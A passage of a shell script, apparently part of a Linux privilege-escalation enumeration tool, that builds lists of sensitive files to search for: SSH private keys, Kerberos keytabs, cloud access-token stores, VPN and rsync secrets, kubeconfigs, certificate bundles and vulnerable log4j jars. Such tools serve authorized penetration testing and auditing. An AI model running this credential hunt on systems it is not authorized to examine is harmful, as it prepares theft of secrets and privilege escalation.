  PSTORAGE_MONGO=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "mongod.*\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_ROCKETCHAT=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/systemd|^/usr|^/mnt|^/lib|^/bin|^/.cache|^/applications|^/cdrom|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "rocketchat\.service$" | sort | uniq | head -n 70)
  PSTORAGE_SUPERVISORD=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "supervisord\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_CESI=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "cesi\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_RSYNC=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "rsyncd\.conf$|rsyncd\.secrets$" | sort | uniq | head -n 70)
  PSTORAGE_HOSTAPD=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "hostapd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_WIFI_CONNECTIONS=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/etc" | grep -E "system-connections$" | sort | uniq | head -n 70)
  PSTORAGE_PAM_AUTH=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/etc" | grep -E "pam\.d$" | sort | uniq | head -n 70)
  PSTORAGE_NFS_EXPORTS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/etc" | grep -E "exports$" | sort | uniq | head -n 70)
  PSTORAGE_GLUSTERFS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "glusterfs\.pem$|glusterfs\.ca$|glusterfs\.key$" | sort | uniq | head -n 70)
  PSTORAGE_ANACONDA_KS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "anaconda-ks\.cfg$" | sort | uniq | head -n 70)
  PSTORAGE_RACOON=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "racoon\.conf$|psk\.txt$" | sort | uniq | head -n 70)
  PSTORAGE_KUBERNETES=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "kubeconfig$|kubelet-kubeconfig$|psk\.txt$|\.kube.*$|kubelet$|kube-proxy$|kubernetes$" | sort | uniq | head -n 70)
  PSTORAGE_VNC=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "\.vnc$|.*vnc.*\.c.*nf.*$|.*vnc.*\.ini$|.*vnc.*\.txt$|.*vnc.*\.xml$" | sort | uniq | head -n 70)
  PSTORAGE_LDAP=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "ldap$" | sort | uniq | head -n 70)
  PSTORAGE_LOG4SHELL=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/bin|^/private|^/var|^/media|^/usr|^/.cache|^/applications|^$GREPHOMESEARCH|^/snap|^/srv|^/lib64|^/etc|^/sbin|^/lib32|^/lib|^/cdrom|^/opt|^/mnt|^/tmp" | grep -E "log4j-core.*\.jar$" | sort | uniq | head -n 70)
  PSTORAGE_OPENVPN=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.ovpn$" | sort | uniq | head -n 70)
  PSTORAGE_SSH=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "id_dsa.*$|id_rsa.*$|known_hosts$|authorized_hosts$|authorized_keys$" | sort | uniq | head -n 70)
  PSTORAGE_CERTSB4=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib.*' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.pem$|.*\.cer$|.*\.crt$" | sort | uniq | head -n 70)
  PSTORAGE_CERTSBIN=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib/.*' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.csr$|.*\.der$" | sort | uniq | head -n 70)
  PSTORAGE_CERTSCLIENT=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib/.*' | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E ".*\.pfx$|.*\.p12$" | sort | uniq | head -n 70)
  PSTORAGE_SSH_AGENTS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/tmp" | grep -E "agent.*$" | sort | uniq | head -n 70)
  PSTORAGE_SSH_CONFIG=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^$GREPHOMESEARCH|^/usr" | grep -E "ssh.*config$" | sort | uniq | head -n 70)
  PSTORAGE_CLOUD_CREDENTIALS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "credentials\.db$|legacy_credentials\.db$|access_tokens\.db$|access_tokens\.json$|accessTokens\.json$|azureProfile\.json$|TokenCache\.dat$|AzureRMContext\.json$|\.bluemix$" | sort | uniq | head -n 70)
  PSTORAGE_KERBEROS=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "krb5\.conf$|.*\.keytab$|\.k5login$|kadm5\.acl$|secrets\.ldb$|\.secrets\.mkey$|sssd\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_KIBANA=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "kibana\.y.*ml$" | sort | uniq | head -n 70)
  PSTORAGE_KNOCKD=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/etc/init.d/' | grep -E "^/etc" | grep -E ".*knockd.*$" | sort | uniq | head -n 70)
  PSTORAGE_LOGSTASH=$(echo -e "$FIND_DIR_ETC\n$FIND_DIR_SBIN\n$FIND_DIR_CACHE\n$FIND_DIR_MEDIA\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_USR\n$FIND_DIR_OPT\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_SNAP\n$FIND_DIR_VAR\n$FIND_DIR_TMP\n$FIND_DIR_BIN\n$FIND_DIR_SRV\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_CDROM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "logstash$" | sort | uniq | head -n 70)
  PSTORAGE_ELASTICSEARCH=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "elasticsearch\.y.*ml$" | sort | uniq | head -n 70)
  PSTORAGE_VAULT_SSH_HELPER=$(echo -e "$FIND_SYSTEM\n$FIND_LIB\n$FIND_VAR\n$FIND_TMP\n$FIND_BIN\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_ETC\n$FIND_SRV\n$FIND_LIB64\n$FIND_MNT\n$FIND_APPLICATIONS\n$FIND_USR\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB32\n$FIND_SBIN\n$FIND_RUN\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_CDROM\n$FIND_SYSTEMD\n$FIND_SYS\n$FIND_CONCOURSE_KEYS\n$FIND_OPT\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^/sbin|^/usr|^/mnt|^/cdrom|^/bin|^/.cache|^/applications|^$GREPHOMESEARCH|^/private|^/snap|^/opt|^/tmp|^/srv|^/etc|^/var|^/media" | grep -E "vault-ssh-helper\.hcl$" | sort | uniq | head -n 70)
